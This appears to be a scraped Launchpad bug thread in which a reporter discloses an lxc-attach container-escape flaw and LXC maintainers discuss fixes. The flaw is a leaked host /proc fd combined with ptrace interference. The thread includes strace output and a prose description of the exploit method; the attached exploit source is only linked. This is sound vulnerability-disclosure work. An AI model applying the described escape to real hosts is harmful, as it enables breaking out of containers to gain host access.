          <a href="+edit" title="Edit tags" id="tags-trigger" class="sprite edit action-icon">Edit</a>
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-7425" title="The arcmsr_iop_message_xfer function ...">2016-7425</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-8649" title="lxc-attach in LXC before 1.0.9 and 2....">2016-8649</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-8655" title="Race condition in net/packet/af_packe...">2016-8655</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-8658" title="Stack-based buffer overflow in the br...">2016-8658</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-04T20:33:33.086518+00:00" title="2016-11-04 20:33:33 UTC">on 2016-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4772615/+files/LxcAttachEscape.c">LxcAttachEscape.c</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4772615">Edit</a>
        (2.0 KiB,
        text/x-csrc)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-04T21:15:19.412413+00:00" title="2016-11-04 21:15:19 UTC">on 2016-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the report, Roman. I&#x27;ve subscribed the LXC maintainers so that they can have a look and comment.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the report, Roman. I've subscribed the LXC maintainers so that they can have a look and comment.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-04T21:31:00.729625+00:00" title="2016-11-04 21:31:00 UTC">on 2016-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the report.</p>
<p>As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We&#x27;re also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.</p>
<p>It&#x27;s certainly our goal that lxc-attach shouldn&#x27;t rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the report.

As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We're also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.

It's certainly our goal that lxc-attach shouldn't rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-04T21:46:58.047594+00:00" title="2016-11-04 21:46:58 UTC">on 2016-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-04T22:38:40.192494+00:00" title="2016-11-04 22:38:40 UTC">on 2016-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>A workaround we&#x27;re now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can&#x27;t ptrace something that&#x27;s being ptraced).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">A workaround we're now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can't ptrace something that's being ptraced).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-05T23:04:31.087234+00:00" title="2016-11-05 23:04:31 UTC">on 2016-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve been working on the ptrace fix and so far I haven&#x27;t found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've been working on the ptrace fix and so far I haven't found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-05T23:49:11.942203+00:00" title="2016-11-05 23:49:11 UTC">on 2016-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I&#x27;m not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can&#x27;t seem to reproduce but maybe I&#x27;m just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I'm not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can't seem to reproduce but maybe I'm just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-06T00:27:06.683890+00:00" title="2016-11-06 00:27:06 UTC">on 2016-11-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):</p>
<p><a rel="nofollow" href="https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&amp;id=2e41414828bb0b066bde2f156cfa848c38531edf">https:/<wbr />/git.kernel.<wbr />org/cgit/<wbr />linux/kernel/<wbr />git/ebiederm/<wbr />user-namespace.<wbr />git/commit/<wbr />?h=for-<wbr />next&amp;id=<wbr />2e41414828bb0b0<wbr />66bde2f156cfa84<wbr />8c38531edf</a></p>
<p>It&#x27;d be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):

https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&amp;id=2e41414828bb0b066bde2f156cfa848c38531edf

It'd be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-07T15:06:35.655959+00:00" title="2016-11-07 15:06:35 UTC">on 2016-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Christian Brauner (comment #7):</p>
<p><span class="foldable-quoted">&gt; can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.
</span></p>
<p>The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().</p>
<p>If you do a &quot;strace -s256 -f screen lxc-attch -n name&quot; (without your self-ptrace patch), you can find following calls:</p>
<p># This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....<br />
[pid  1712] open(&quot;/proc&quot;, O_RDONLY|<wbr />O_DIRECTORY) = 7<br />
... immediately afterwards<br />
[pid  1712] open(&quot;/<wbr />proc/1632/<wbr />ns/user&quot;<wbr />, O_RDONLY|O_CLOEXEC) = 9<br />
[pid  1712] open(&quot;/<wbr />proc/1632/<wbr />ns/mnt&quot;<wbr />, O_RDONLY|O_CLOEXEC) = 10<br />
...<br />
# now use the ns-fds, thus changing the root to reside in container<br />
[pid  1712] setns(9, 0)                 = 0<br />
[pid  1712] close(9)                    = 0<br />
[pid  1712] setns(10, 0)                = 0<br />
...<br />
# later on after changing to guest-ns uid=0, the fd is used.<br />
[pid  1713] openat(7, &quot;self/attr/<wbr />current&quot;<wbr />, O_RDWR) = 8<br />
[pid  1713] write(8, &quot;changeprofile lxc-container-<wbr />default-<wbr />cgns\0&quot;<wbr />, 41) = 41</p>
<p>The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.</p>
<p>A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Christian Brauner (comment #7): 

&gt; can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.

The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().

If you do a "strace -s256 -f screen lxc-attch -n name" (without your self-ptrace patch), you can find following calls:

# This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....
[pid  1712] open("/proc", O_RDONLY|O_DIRECTORY) = 7
... immediately afterwards
[pid  1712] open("/proc/1632/ns/user", O_RDONLY|O_CLOEXEC) = 9
[pid  1712] open("/proc/1632/ns/mnt", O_RDONLY|O_CLOEXEC) = 10
...
# now use the ns-fds, thus changing the root to reside in container
[pid  1712] setns(9, 0)                 = 0
[pid  1712] close(9)                    = 0
[pid  1712] setns(10, 0)                = 0
...
# later on after changing to guest-ns uid=0, the fd is used.
[pid  1713] openat(7, "self/attr/current", O_RDWR) = 8
[pid  1713] write(8, "changeprofile lxc-container-default-cgns\0", 41) = 41


The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.

A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-07T21:44:10.969561+00:00" title="2016-11-07 21:44:10 UTC">on 2016-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ok, so for the second part, preventing the /proc attack. We need the procfd to the host&#x27;s namespace so that we can set the lsm label later on in attach_<wbr />child_main(<wbr />). The obvious solution that we&#x27;ve shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(<wbr />CLONE_NEWNS|<wbr />CLONE_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with</p>
<p>unshare -Ump --mount-proc -- sh</p>
<p>mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That&#x27;s why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc_clone(<wbr />chroot_<wbr />us_and_<wbr />clone_again, ..., CLONE_PARENT) in and chroot us, and then call lxc_clone(<wbr />attach_<wbr />child_main, &amp;payload, CLONE_PARENT) within chroot_<wbr />us_and_<wbr />clone_again(<wbr />) to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This *could* work: Due to CLONE_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot_<wbr />us_and_<wbr />clone_again(<wbr />) child in lxc_attach() while handing back the PID of the exec&#x27;ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc_attach() he would effectively find himself safely chrooted.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ok, so for the second part, preventing the /proc attack. We need the procfd to the host's namespace so that we can set the lsm label later on in attach_child_main(). The obvious solution that we've shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(CLONE_NEWNS|CLONE_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with

unshare -Ump --mount-proc -- sh

mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That's why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc_clone(chroot_us_and_clone_again, ..., CLONE_PARENT) in and chroot us, and then call lxc_clone(attach_child_main, &amp;payload, CLONE_PARENT) within chroot_us_and_clone_again() to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This *could* work: Due to CLONE_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot_us_and_clone_again() child in lxc_attach() while handing back the PID of the exec'ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc_attach() he would effectively find himself safely chrooted.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-08T09:34:44.063843+00:00" title="2016-11-08 09:34:44 UTC">on 2016-11-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>OK, but sounds complicated.</p>
<p>I&#x27;m not sure if that could work, but what about...</p>
<p>* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot_root would be needed here to cleanup.<br />
* Open a directory fd to the root of this helper mountns<br />
* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.<br />
* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.</p>
